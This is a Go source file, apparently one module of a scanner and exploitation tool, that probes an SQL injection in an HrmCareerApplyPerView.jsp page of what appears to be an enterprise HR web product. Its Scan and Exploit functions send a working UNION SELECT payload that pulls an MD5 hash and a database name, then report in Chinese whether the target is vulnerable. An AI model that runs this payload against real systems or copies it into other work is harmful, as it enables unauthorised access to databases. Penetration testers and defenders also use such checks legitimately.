package vulners

import (
	"github.com/fatih/color"
	"strings"
)

type Wc06 struct {
}

func (s *Wc06) Scan(targetUrl string) {
	vulnerable, err := Wc06scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wc06] 存在HrmCareerApplyPerView SQL注入")
	} else {
		color.White("[Wc06] 不存在HrmCareerApplyPerView SQL注入")
	}
}

func (*Wc06) Exploit(targetUrl string) {
	runResult, err := Wc06runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wc06scancore(targetUrl string) (bool, error) {
	url := "/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1+union+select+1,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7"
	resp, err := baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "17f72") {
		return true, nil
	} else {
		return false, nil
	}
}

func Wc06runcore(targetUrl string) (string, error) {
	url := "/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1+union+select+1,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7"
	resp, err := baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()

	if strings.Contains(resContent, "17f72") {
		return "存在HrmCareerApplyPerView SQL注入，需自行构造手工利用\n", nil
	} else {
		return "", nil
	}
}
